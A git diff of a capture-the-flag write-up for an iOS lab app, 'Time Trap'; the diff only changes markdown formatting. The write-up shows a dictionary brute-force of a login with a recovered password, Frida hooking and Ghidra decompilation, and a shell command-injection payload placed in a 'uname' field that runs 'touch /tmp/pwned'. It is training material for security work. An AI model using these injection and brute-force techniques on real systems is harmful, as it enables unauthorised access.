@@ -1,7 +1,4 @@
-Title: MobileHackingLab - Time Trap
-Slug: mobile/mobilehackinglab/time-trap
-Date: 2025-10-26 18:00
-Category: Mobile
+# MobileHackingLab - Time Trap
 
 This is an iOS mobile challenge from [MobileHackingLabs](https://www.mobilehackinglab.com/course/lab-time-trap)
 Time Trap is a fictional application that showcases insecure practices commonly found in internal applications.
@@ -10,7 +7,7 @@ Time Trap is a fictional application that showcases insecure practices commonly 
 
 The app presents itself as follows:
 
-![[time-trap-app-1.jpg]]
+![time-trap-app-1](../../images/mobile/mobilehackinglab/time-trap/time-trap-app-1.jpg)
 
 ## Password Bruteforcing
 
@@ -18,57 +15,57 @@ In the challenge tips, the username `emp002` is provided, stating that this user
 
 When trying logging in, the following HTTP request is sent:
 
-![[time-trap-req-1.png]]
+![time-trap-req-1](../../images/mobile/mobilehackinglab/time-trap/time-trap-req-1.png)
 
 Password has been brute-forced using `Burp`'s intruder, performing a dictionary-based brute-force attack as follows:
 
-![[time-trap-req-2.png]]
+![time-trap-req-2](../../images/mobile/mobilehackinglab/time-trap/time-trap-req-2.png)
 
 Found password is: `firefly`.
 
-![[time-trap-req-3.png]]
+![time-trap-req-3](../../images/mobile/mobilehackinglab/time-trap/time-trap-req-3.png)
 
 Having the password, it's possible to login into the application:
 
-![[time-trap-app-2.jpg]]
+![time-trap-app-2](../../images/mobile/mobilehackinglab/time-trap/time-trap-app-2.jpg)
 
 Following the successful login HTTP request:
 
-![[time-trap-req-4.png]]
+![time-trap-req-4](../../images/mobile/mobilehackinglab/time-trap/time-trap-req-4.png)
 
 
 This is the home screen of the application after the login:
 
-![[time-trap-app-3.jpg]]
+![time-trap-app-3](../../images/mobile/mobilehackinglab/time-trap/time-trap-app-3.jpg)
 
 ## Dynamic & Static Analysis
 
 After tapping on "Check In", a time starts as follows:
 
-![[time-trap-app-4.jpg]]
+![time-trap-app-4](../../images/mobile/mobilehackinglab/time-trap/time-trap-app-4.jpg)
 
 Two request HTTP are sent:
 
 1. `GET /time-trap/attendance-list` which retrieves a list of all past check-in and check-out
 2. `POST /time-trap/attendance` which seems to be saving on the backend the check-in and the check-out. The parameter `uname` it's really interesting.
 
-![[time-trap-req-5.png]]
+![time-trap-req-5](../../images/mobile/mobilehackinglab/time-trap/time-trap-req-5.png)
 
 
-![[time-trap-req-6.png]]
+![time-trap-req-6](../../images/mobile/mobilehackinglab/time-trap/time-trap-req-6.png)
 
 To better understand what's going on underneath, I've run `frida-trace` as follows, tracing all `Time_Trap` methods:
 
-~~~
+```
 frida-trace -U -N com.mobilehackinglab.TimeTrap3.36V2J65722 -m '*[Time_Trap* *]'
-~~~
+```
 
 
-![[time-trap-frida-1.png]]
+![time-trap-frida-1](../../images/mobile/mobilehackinglab/time-trap/time-trap-frida-1.png)
 
 This revealed that class `Time_Trap.AttendanceController` is the responsible for the previous HTTP requests. This class has been decompiled with `Ghidra`:
 
-~~~c
+```c
 
 /* WARNING: Removing unreachable block (ram,0x00010000ea08) */
 /* WARNING: Removing unreachable block (ram,0x00010000ec0c) */
@@ -632,27 +629,27 @@ Time_Trap::AttendanceController::buttonPressed(AttendanceController *this,UIButt
   _objc_release(local_200);
   return;
 }
-~~~
+```
 
 This controller seems to be constructing a shell command and passing it to a method named `_executeCommand()`; this command is used to retrieve current device kernel and OS information.
 
 
-![[time-trap-static-1.png]]
+![time-trap-static-1](../../images/mobile/mobilehackinglab/time-trap/time-trap-static-1.png)
 
 
-![[time-trap-static-2.png]]
+![time-trap-static-2](../../images/mobile/mobilehackinglab/time-trap/time-trap-static-2.png)
 
 Based on the decompiled code, the constructed command would be the following:
 
-~~~shell
+```shell
 if [[ $(uname -a) != "<USER PROVIDED INPUT>" ]]; then uname -a; fi
-~~~
+```
 
 where `<USER PROVIDED INPUT>` is the value provided in the `uname` body parameter from the previous HTTP POST request.
 
 Following the decompiled code for `_executeCommand()`:
 
-~~~c
+```c
 void _executeCommand(undefined8 param_1)
 
 {
@@ -729,20 +726,20 @@ void _executeCommand(undefined8 param_1)
                     /* WARNING: Subroutine does not return */
   ___stack_chk_fail();
 }
-~~~
+```
 
 This code simply invokes `posix_spawn` with the previously constructed command:
 
-![[time-trap-static-3.png]]
+![time-trap-static-3](../../images/mobile/mobilehackinglab/time-trap/time-trap-static-3.png)
 
 
 To confirm the static analysis, I've decide to hook this method and dump it's arguments. From `Ghidra`, it seems that the method it's exported so it's trivial to hook it with a `frida` script
 
-![[time-trap-static-4.png]]
+![time-trap-static-4](../../images/mobile/mobilehackinglab/time-trap/time-trap-static-4.png)
 
 Following the `frida` script:
 
-~~~javascript
+```javascript
 Interceptor.attach(Module.findExportByName("Time Trap", "executeCommand"), {
     onEnter: function (args) { 
         console.log("[>] Executing command...")
@@ -751,37 +748,37 @@ Interceptor.attach(Module.findExportByName("Time Trap", "executeCommand"), {
     onLeave: function (retval) {
     }
 });
-~~~
+```
 
-![[time-trap-frida-2.png]]
+![time-trap-frida-2](../../images/mobile/mobilehackinglab/time-trap/time-trap-frida-2.png)
 
 After tapping "Check-In", I've intercepted the HTTP request with `Burp` and I've set the value `test` in the `uname` parameter as follows:
 
-![[time-trap-req-7.png]]
+![time-trap-req-7](../../images/mobile/mobilehackinglab/time-trap/time-trap-req-7.png)
 
 After forwarding, the request, the `frida` script dumped the first `executeCommand()` parameter  value: `uname -a`.
 However, when tapping on "Check Out", the dumped parameter value is the following: `if [[ $(uname -a) != "<USER PROVIDED INPUT>" ]]; then uname -a; fi`
 
-![[time-trap-frida-3.png]]
+![time-trap-frida-3](../../images/mobile/mobilehackinglab/time-trap/time-trap-frida-3.png)
 
 This confirms what emerged from the static analysis: the application is vulnerable to Command Injection. 
 In order to exploit this vulnerability, I've used the following payload in the `uname` parameter:
 
-~~~bash
+```bash
 \" || 1 -eq 1 ]]; then touch /tmp/pwned; elif [[ $(uname -a) != \"
-~~~
+```
 
 This will result in the following shell command being executed:
 
-~~~bash
+```bash
 if [[ $(uname -a) != "" || 1 -eq 1 ]]; then touch /tmp/pwned; elif [[ $(uname -a) != "" ]]; then uname -a; fi
-~~~
+```
 
 This is confirmed by the `frida` dump script:
 
-![[time-trap-frida-4.png]]
+![time-trap-frida-4](../../images/mobile/mobilehackinglab/time-trap/time-trap-frida-4.png)
 
 On `Burp`, the "Check Out" request returns the flag: `MHL{9_t0_5_C0mm4ndz_Sl4v1ng_4w4y}`
 
-![[time-trap-req-8.png]]
+![time-trap-req-8](../../images/mobile/mobilehackinglab/time-trap/time-trap-req-8.png)
 
